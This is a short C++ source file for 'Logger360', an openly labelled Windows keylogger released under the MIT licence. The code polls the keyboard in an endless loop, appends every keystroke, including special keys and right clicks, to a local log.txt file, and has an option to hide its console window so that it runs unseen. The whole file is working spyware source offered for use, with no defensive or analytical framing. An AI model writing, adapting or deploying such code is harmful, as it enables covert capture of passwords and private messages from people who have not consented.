// Logger360 , A simple .NET (DotNet C++) Keylogger

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

bool showconsole = true; // " false " = Do not show console  |  " true " = Show console

void log_file(string input) {
	fstream LogFile;
	LogFile.open("log.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		log_file(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		log_file("\n");
		return true;
	case '¾':
		cout << ".";
		log_file(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		log_file("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		log_file("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		log_file("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		log_file("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		log_file("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		log_file("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		log_file("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		log_file("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		log_file("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		log_file("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		log_file("#ALT");
		return true;
	default:
		return false;
	}
}

int main() {
	if (showconsole) {

	}
	else {
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	}
	char KEY = 'x';
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++) {
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					fstream LogFile;
					LogFile.open("log.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}
				}
			}
		}

	}
}


// MIT License
// 
// Copyright(c) 2022
// 
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this softwareand associated documentation files(the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and /or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions :
// 
// The above copyright noticeand this permission notice shall be included in all
// copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.